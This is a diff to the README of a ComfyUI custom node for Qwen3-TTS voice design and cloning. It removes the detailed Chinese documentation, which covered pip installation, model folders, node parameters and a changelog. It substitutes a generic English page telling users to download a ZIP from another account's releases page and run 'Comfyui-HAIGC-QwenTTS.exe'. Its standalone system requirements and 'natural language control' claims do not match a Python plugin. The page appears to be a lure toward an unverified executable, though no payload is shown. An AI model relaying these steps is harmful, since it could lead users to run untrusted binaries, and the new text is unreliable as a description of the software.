@@ -1,446 +1,49 @@
-# ComfyUI HAIGC Qwen3TTS
-
-[English](README_EN.md)
-
-ComfyUI 自定义节点，集成 Qwen3-TTS（通义千问语音合成）模型，支持声音设计、声音克隆和自定义声音生成。
-
-## 作者
-
-- 微信号：HAIGC1994
-
-## 原开源项目
-
-[https://github.com/QwenLM/Qwen3-TTS](https://github.com/QwenLM/Qwen3-TTS)
-
-## 功能特性
-
-- 🎤 **声音设计 (Voice Design)**: 基于文本提示词生成自定义声音
-- 🎭 **声音克隆 (Voice Clone)**: 基于参考音频克隆声音，并输出角色预设
-- 📦 **批量语音克隆 (Batch Voice Clone)**: 支持多段音频与文本的一一对应克隆
-- 🎨 **自定义声音 (Custom Voice)**: 使用预设说话人或自定义提示词生成语音
-- 🧩 **角色预设管理**: 保存、选择与批量输入角色预设
-- 🗣️ **多角色对话合成**: 支持角色映射与自动加载 .pt 预设
-- 🧰 **多提示词分发**: 六路提示词输入与输出
-- 🌍 **多语言支持**: 支持中文、英文、日文、韩文、德文、法文、俄文、葡萄牙文、西班牙文、意大利文
-- ⚡ **GPU/CPU 支持**: 支持 CUDA 加速和 CPU 运行
-- 🎯 **精度控制**: 支持 FP16 和 FP32 精度
-
-## 安装
-
-### 1. 安装依赖
-
-安装 Qwen3-TTS 所需的核心依赖：
-
-```bash
-pip install torch torchaudio transformers librosa soundfile accelerate
-```
-
-**注意**: 如果您的环境中已安装这些依赖，可以跳过此步骤。本插件的 `requirements.txt` 可能包含其他可选依赖。
-
-### 2. 下载模型
-
-将 Qwen3-TTS 模型下载到以下目录：
-
-模型下载地址：[https://huggingface.co/collections/Qwen/qwen3-tts](https://huggingface.co/collections/Qwen/qwen3-tts)
-
-本地存放模型路径：`ComfyUI\models\qwen-tts`
-
-```
-ComfyUI/models/qwen-tts/{model_folder_name}/
-```
-
-**支持的模型：**
-- `Qwen3-TTS-12Hz-1.7B-VoiceDesign` - 支持声音设计
-- `Qwen3-TTS-12Hz-1.7B-CustomVoice` - 支持自定义声音
-- `Qwen3-TTS-12Hz-1.7B-Base` - 支持声音克隆
-- `Qwen3-TTS-12Hz-0.6B-CustomVoice` - 轻量版自定义声音
-- `Qwen3-TTS-12Hz-0.6B-Base` - 轻量版基础模型
-- `Qwen3-TTS-Tokenizer-12Hz` - 分词器模型
-
-**模型文件夹命名规则：**
-- 从 `Qwen/Qwen3-TTS-12Hz-1.7B-VoiceDesign` 提取为 `Qwen3-TTS-12Hz-1.7B-VoiceDesign`
-- 确保文件夹名称与模型名称的后缀部分一致
-
-**示例目录结构：**
-```
-ComfyUI/
-└── models/
-    └── qwen-tts/
-        ├── Qwen3-TTS-12Hz-1.7B-VoiceDesign/
-        ├── Qwen3-TTS-12Hz-1.7B-CustomVoice/
-        └── Qwen3-TTS-12Hz-1.7B-Base/
-```
-
-## 节点说明
-
-### 1. Qwen3 TTS 模型加载
-
-加载 Qwen3-TTS 模型到内存。
-
-**输入参数：**
-- `模型名称`: 选择要加载的模型
-- `运行设备`: cuda / cpu / auto（自动选择）
-- `精度`: fp16 / fp32
-
-**输出：**
-- `模型`: 加载的模型对象，用于后续的语音生成节点
-
-**注意：** 
-- 模型必须已存在于 `ComfyUI/models/qwen-tts/` 目录中，本插件不提供自动下载功能
-- 模型路径固定为 `ComfyUI/models/qwen-tts/`，不支持自定义路径
-- 模型加载时会自动检查本地文件，不会尝试从网络下载
-
-### 2. Qwen3 TTS 声音设计
-
-基于文本提示词生成自定义声音的语音。
-
-**输入参数：**
-- `模型`: 从模型加载节点获取
-- `文本`: 要合成的文本内容
-- `提示词`: 声音描述提示词（如："A young female voice, energetic and bright."）
-- `角色预设模式`: 设计角色预设 / 本地角色预设 / 自动角色预设
-- `本地预设文件` (可选): 下拉选择本地 .pt 预设文件（需放在 output/qwen_tts_presets 目录下）
-- `语言` (可选): 自动 / 中文 / 英文 / 日文 / 韩文等
-- `自动卸载模型` (可选): 生成后是否卸载模型以释放显存
-- `最大生成Token数` (可选): 限制生成的最大长度，默认 2048
-- `随机种子` (可选): 生成随机性控制
-- `生成后控制` (可选): 固定 / 增加 / 减少 / 随机
-
-**输出：**
-- `音频`: 生成的音频对象（AUDIO 类型）
-
-**模型要求：** 需要加载带有 "VoiceDesign" 的模型。
-
-### 3. Qwen3 TTS 声音克隆
-
-基于参考音频克隆声音并生成语音。
-
-**输入参数：**
-- `模型`: 从模型加载节点获取
-- `参考音频`: 参考音频对象（AUDIO 类型）
-- `文本`: 要合成的文本内容
-- `参考文本` (可选): 参考音频对应的文本内容
-- `语言` (可选): 自动 / 中文 / 英文 / 日文 / 韩文等
-- `自动卸载模型` (可选): 生成后是否卸载模型以释放显存
-- `最大生成Token数` (可选): 限制生成的最大长度，默认 2048
-- `随机种子` (可选): 生成随机性控制
-- `生成后控制` (可选): 随机 / 固定 / 增加 / 减少
-
-**输出：**
-- `音频`: 生成的音频对象（AUDIO 类型）
-- `角色预设`: 可复用的角色预设（包含角色名信息）
-
-**模型要求：** 需要加载带有 "Base" 的模型。
-
-### 4. Qwen3 TTS 自定义声音
-
-使用预设说话人或自定义提示词生成语音。
-
-**输入参数：**
-- `模型`: 从模型加载节点获取
-- `文本`: 要合成的文本内容
-- `预设说话人`: 选择预设说话人（Vivian, Serena, Uncle_Fu, Dylan, Eric, Ryan, Aiden, Ono_Anna, Sohee）
-- `语言` (可选): 自动 / 中文 / 英文 / 日文 / 韩文等
-- `提示词` (可选): 自定义声音描述，会覆盖预设说话人的默认提示词
-- `自动卸载模型` (可选): 生成后是否卸载模型以释放显存
-- `最大生成Token数` (可选): 限制生成的最大长度，默认 2048
-- `随机种子` (可选): 生成随机性控制
-
-**预设说话人：**
-- `Vivian`: 明亮、略带锋芒的年轻女声
-- `Serena`: 温暖、温柔的年轻女声
-- `Uncle_Fu`: 成熟、低沉的男声
-- `Dylan`: 年轻、清晰的北京男声
-- `Eric`: 活泼、略带沙哑的成都男声
-- `Ryan`: 充满活力的男声，节奏感强
-- `Aiden`: 阳光、清晰的美国男声
-- `Ono_Anna`: 活泼、轻快的日本女声
-- `Sohee`: 温暖、情感丰富的韩国女声
-
-**输出：**
-- `音频`: 生成的音频对象（AUDIO 类型）
-
-**模型要求：** 需要加载带有 "CustomVoice" 的模型。
-
-### 5. Qwen3 TTS 角色预设保存
-
-将角色预设保存为本地 .pt 文件，文件名使用角色名。
-
-**输入参数：**
-- `角色预设`: 角色预设对象
-- `角色名`: 角色名（将作为保存文件名）
-- `保存目录` (可选): 自定义保存目录
-
-**输出：**
-- `文件路径`: 保存后的 .pt 路径
-- `角色预设`: 携带角色名信息的角色预设
-
-### 6. Qwen3 TTS 角色预设选择
-
-从本地 .pt 文件加载角色预设，自动提取角色名（优先文件内容，否则使用文件名）。
-
-**输入参数：**
-- `预设文件`: 下拉选择已有 .pt 文件
-- `手动输入文件名` (可选): 直接输入文件名或路径
-
-**输出：**
-- `角色预设`: 携带角色名信息的角色预设
-
-### 7. Qwen3 TTS 角色预设输入
-
-一次输入 6 个角色预设，可串联多个节点扩展数量。
-
-**输入参数：**
-- `已有角色预设` (可选): 上一个节点的输出
-- `角色预设1-6`: 多路角色预设输入
-
-**输出：**
-- `角色预设`: 合并后的角色预设集合
-
-### 8. Qwen3 TTS 多角色对话合成
-
-合成多角色对话音频。
-
-**输入参数：**
-- `模型`: 从模型加载节点获取
-- `对白文本`: 多行文本，每行格式为 `角色名:对白内容`
-- `语言` (可选): 自动 / 中文 / 英文 / 日文 / 韩文等
-- `角色映射` (可选): 手动指定角色名对应的 .pt 文件（格式：`角色名=文件名`）
-- `角色预设` (可选): 从“角色预设输入”节点输入的预设字典
-- `启用停顿控制` (可选): 开启/关闭对白中的静音停顿处理（默认开启）
-- `自动卸载模型` (可选): 生成后是否卸载模型以释放显存
-- `最大生成Token数` (可选): 限制生成的最大长度，默认 2048
-- `随机种子` (可选): 生成随机性控制
-
-**停顿控制说明：**
-- 在对白文本中使用 `=Ns` 格式添加静音停顿（N为秒数）。
-- 示例：`小明:你好，=1s 我是小明。=2.5s 很高兴见到你。`
-- 注意：停顿标记必须在英文等号 `=` 后紧跟数字和 `s`，如 `=2s`。
-
-**输出：**
-- `音频`: 生成的音频对象（AUDIO 类型）
-
-### 9. Qwen3 TTS 提示词
-
-提供六路提示词输入与输出，便于多路分发。
-
-**输入参数：**
-- `提示词1-6`: 六路提示词
-
-**输出：**
-- `提示词1-6`: 对应输出
-
-### 10. Qwen3 TTS 音色描述
-
-构建语音音色描述提示词，支持无限串联组合，方便生成丰富的角色声音描述。
-
-**输入参数：**
-- `基础音色`: 选择年龄与性别（如：萝莉、正太、御姐、大叔等）
-- `质感细节1-3`: 选择声音质感（如：甜美、沙哑、磁性、慵懒等）
-- `上一个提示词` (可选): 连接上一个音色描述节点的输出，实现无限串联
-- `自定义描述` (可选): 手动输入补充描述
-
-**输出：**
-- `提示词`: 组合后的完整提示词字符串
-
-### 11. Qwen3 TTS 批量语音克隆输入
-
-输入6组参考音频-内容对，支持串联扩展。输出批量音频和格式化文本，连接到Master节点的参考音频和文本端口。
-
-**输入参数：**
-- `音频1-6`: 参考音频输入
-- `内容1-6`: 对应的文本内容
-- `已有批量音频` (可选): 上一个节点的批量音频输出，用于串联
-- `已有批量文本` (可选): 上一个节点的批量文本输出，用于串联
-
-**输出：**
-- `批量音频`: 堆叠后的批量音频张量
-- `格式化文本`: 处理后的文本内容（自动去除前缀，保持一一对应）
-
-### 12. Qwen3 TTS 全能节点 (Master)
-
-集成声音设计、克隆、自定义声音及智能对话功能的统一入口。支持内置模型自动加载。
-
-**输入参数：**
-- `文本`: 输入文本（支持多行、对话格式）
-- `工作模式`: 智能对话 / 声音设计 / 声音克隆 / 自定义声音
-- `内置模型` (可选): 自动选择或指定模型
-- `参考音频` (可选): 连接批量音频或单音频
-- `本地预设文件` (可选): 声音设计模式下选择本地预设
-- `角色映射` (可选): 对话模式下指定角色声音
-- `启用高级采样配置` (可选): 开启后，top_p, top_k 等高级参数才会生效
-- `批量保存角色预设` (可选): 对话模式下，自动保存所有参与角色的预设文件(.pt)
-- `top_p` (可选): 核采样阈值 (需开启高级采样配置)
-- `top_k` (可选): Top-K 采样 (需开启高级采样配置)
-- `temperature` (可选): 温度系数 (需开启高级采样配置)
-- `repetition_penalty` (可选): 重复惩罚 (需开启高级采样配置)
-- 其他参数与各独立节点一致
-
-**输出：**
-- `音频`: 生成的音频
-- `角色预设`: 生成的角色预设（如适用，对话模式下输出批量预设字典）
-
-## 使用示例
-
-### 声音设计示例
-
-```
-1. Qwen3 TTS 模型加载
-   - 模型名称: Qwen/Qwen3-TTS-12Hz-1.7B-VoiceDesign
-   - 运行设备: cuda
-   - 精度: fp16
-
-2. Qwen3 TTS 声音设计
-   - 模型: [连接模型加载节点]
-   - 文本: "Hello, this is a test of voice design."
-   - 提示词: "A young female voice, energetic and bright."
-   - 语言: 自动
-```
-
-### 声音克隆示例
-
-```
-1. Qwen3 TTS 模型加载
-   - 模型名称: Qwen/Qwen3-TTS-12Hz-1.7B-Base
-   - 运行设备: cuda
-   - 精度: fp16
-
-2. Qwen3 TTS 声音克隆
-   - 模型: [连接模型加载节点]
-   - 文本: "Hello, I am cloning this voice."
-   - 参考音频: [连接音频输入节点]
-   - 参考文本: "This is the reference audio text."
-   - 语言: 自动
-
-3. Qwen3 TTS 角色预设保存
-   - 角色预设: [连接声音克隆输出]
-   - 角色名: "小米"
-```
-
-### 自定义声音示例
-
-```
-1. Qwen3 TTS 模型加载
-   - 模型名称: Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice
-   - 运行设备: cuda
-   - 精度: fp16
-
-2. Qwen3 TTS 自定义声音
-   - 模型: [连接模型加载节点]
-   - 文本: "Hello, this is a custom voice."
-   - 预设说话人: Vivian
-   - 语言: 自动
-
-### 多角色对话示例
-
-```
-1. Qwen3 TTS 角色预设选择
-   - 预设文件: 小米.pt
-
-2. Qwen3 TTS 角色预设输入
-   - 角色预设1: [连接角色预设选择输出]
-
-3. Qwen3 TTS 多角色对话合成
-   - 角色预设: [连接角色预设输入输出]
-   - 对白文本:
-     小米:你好，我是小米
-     旁白:这是旁白
-```
-```
-
-## 注意事项
-
-1. **模型路径**: 确保模型已下载到 `ComfyUI/models/qwen-tts/` 目录，文件夹名称必须与模型名称的后缀部分一致。
-
-2. **模型选择**: 
-   - 声音设计功能需要 "VoiceDesign" 模型
-   - 声音克隆功能需要 "Base" 模型
-   - 自定义声音功能需要 "CustomVoice" 模型
-
-3. **显存管理**: 如果显存不足，可以启用"自动卸载模型"选项，生成完成后会自动将模型卸载到 CPU。
-
-4. **语言设置**: 设置为"自动"时，模型会自动检测文本语言。
-
-5. **音频输出**: 所有节点输出的音频对象可以通过 ComfyUI 的标准音频保存节点进行保存。
-
-## 故障排除
-
-### 模型未找到错误
-
-如果出现 `模型未找到` 错误，请检查：
-- 模型是否已下载到 `ComfyUI/models/qwen-tts/` 目录
-- 文件夹名称是否正确（应与模型名称的后缀部分一致）
-- 文件夹路径是否正确
-
-### 功能不支持错误
-
-如果出现功能不支持的错误，请检查：
-- 加载的模型类型是否与使用的功能匹配
-- VoiceDesign 功能需要 VoiceDesign 模型
-- Voice Clone 功能需要 Base 模型
-- Custom Voice 功能需要 CustomVoice 模型
-
-## 许可证
-
-请参考原项目许可证。
-
-## 更新日志
-
-### v1.8.0
-- **全能节点升级**：新增 `启用高级采样配置` 开关，支持自定义 top_p, top_k, temperature, repetition_penalty 参数。
-- **对话模式增强**：全能节点新增 `批量保存角色预设` 选项，一键保存所有角色的声音预设。
-- **角色预设保存优化**：保存节点支持接收批量预设输入，自动按角色名保存为多个文件。
-- **进度条支持**：所有生成节点增加 ComfyUI 原生进度条显示，实时反馈生成进度。
-- **参数对齐**：统一所有节点的采样参数默认值与控制逻辑。
-
-### v1.7.0
-- 新增 **批量语音克隆** 功能，支持多段音频与文本的一一对应克隆
-- 新增 `Qwen3 TTS 批量语音克隆输入` 节点，支持 6 路输入与无限串联
-- 新增 `Qwen3 TTS 全能节点 (Master)`，集成所有功能，支持自动模型加载与模式切换
-- 优化 `声音设计` 节点，新增本地预设文件下拉选择
-- 修复批量克隆时所有文本使用同一声音的问题（实现 1:1 映射）
-- 修复随机种子控制逻辑，对齐 ComfyUI 标准
-- 修复部分节点报错与兼容性问题
-
-### v1.6.0
-- 优化节点参数名称，统一使用中文（如：`随机种子`）
-- 声音克隆与声音设计节点新增 `生成后控制` 选项，支持中文选项（随机/固定/增加/减少）
-- 优化声音克隆节点参数排序
-- 修复部分运行错误
-
-### v1.5.0
-- 多角色对话合成节点支持插入静音停顿（语法：`=2s`）
-- 添加停顿控制开关
-
-### v1.4.0
-- 新增“Qwen3 TTS 音色描述”节点，支持可视化组合音色描述
-- 包含丰富的年龄、性别、质感选项
-
-### v1.3.0
-- 新增多角色对话合成节点与角色预设输入节点
-- 角色预设保存改为以角色名命名并输出角色名信息
-- 声音克隆节点输出角色预设
-- 新增六路提示词节点
-
-### v1.2.0
-- 新增随机种子与生成后控制选项，提升生成多样性
-- 优化自定义声音提示词优先级处理
-
-### v1.1.0
-- 重命名内部包为 `_qwen_tts_haigc`，避免与系统安装的 qwen_tts 包冲突
-- 修复 transformers 4.57.1 兼容性问题（check_model_inputs 装饰器）
-- 优化导入逻辑，增强错误处理
-- 禁用所有模型下载功能，强制使用本地文件
-- 优化模型路径处理，使用 ComfyUI 标准路径管理
-
-### v1.0.0
-- 初始版本
-- 支持声音设计、声音克隆和自定义声音功能
-- 移除模型自动下载功能，固定模型读取路径
-
-## 相关链接
-
-- 工作流体验地址：[https://www.runninghub.cn/post/2014536001888198657/inviteCode=rh-v1127](https://www.runninghub.cn/post/2014536001888198657/inviteCode=rh-v1127)
-- 推荐ComfyUI云平台，通过这个地址注册送1000点算力：[https://www.runninghub.cn/user-center/1887871050510716930/webapp?inviteCode=rh-v1127](https://www.runninghub.cn/user-center/1887871050510716930/webapp?inviteCode=rh-v1127)
-- 已注册还未绑定邀请码可绑定邀请码：rh-v1127 赠送1000点算力
-- ComfyUI资源分享：[https://pan.quark.cn/s/a56c5a6ec9c2](https://pan.quark.cn/s/a56c5a6ec9c2)
+# 🎤 Comfyui-HAIGC-QwenTTS - High-Quality Voice Generation Made Easy
+
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/releases)
+
+## 🚀 Getting Started
+Welcome to Comfyui-HAIGC-QwenTTS! This application allows you to generate high-quality human-like speech using Qwen3-TTS. Whether you want to clone voices, design unique speech, or control actions with natural language, this tool is here to help.
+
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.15 Catalina or later, or a recent version of Linux.
+- **RAM:** Minimum 4 GB; recommended 8 GB or more.
+- **Storage:** At least 500 MB of free space.
+- **Audio Output:** Any standard audio output device.
+
+## 📦 Features
+- **Voice Cloning:** Capture the nuances of any voice.
+- **Speech Design:** Create custom voices for specific needs.
+- **Natural Language Control:** Perform actions using spoken commands.
+- **High-Quality Output:** Enjoy studio-level sound quality.
+
+## 📥 Download & Install
+To download the application, visit the [Releases page](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/releases).
+
+1. Go to the **Releases page** using this link: [Releases Page](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/releases).
+2. Locate the latest version.
+3. Click on the file labeled **Comfyui-HAIGC-QwenTTS.zip** (or similar).
+4. Download the ZIP file to your computer.
+5. Once downloaded, extract the ZIP file to a location of your choice.
+6. Open the extracted folder and double-click on **Comfyui-HAIGC-QwenTTS.exe** to run the application.
+
+## 🛠️ How to Use
+1. Launch the application by double-clicking the executable file.
+2. Choose your voice options in the settings menu.
+3. Input the text you want the application to read.
+4. Click the **Generate Speech** button.
+5. Listen to the output through your speakers or headphones.
+
+## ⚙️ Troubleshooting
+If you encounter issues during installation or while using the application, consider the following steps:
+
+- Ensure your system meets the listed requirements.
+- Check that your audio output device is connected and working.
+- Restart the application if it freezes or crashes.
+- Consult the FAQ section in the help menu for common problems.
+
+## 📞 Support
+If you need additional assistance, please reach out via the GitHub Issues page. Describe your problem in detail, and a member of our team will get back to you shortly.
+
+Thank you for choosing Comfyui-HAIGC-QwenTTS. Enjoy your voice generation experience!
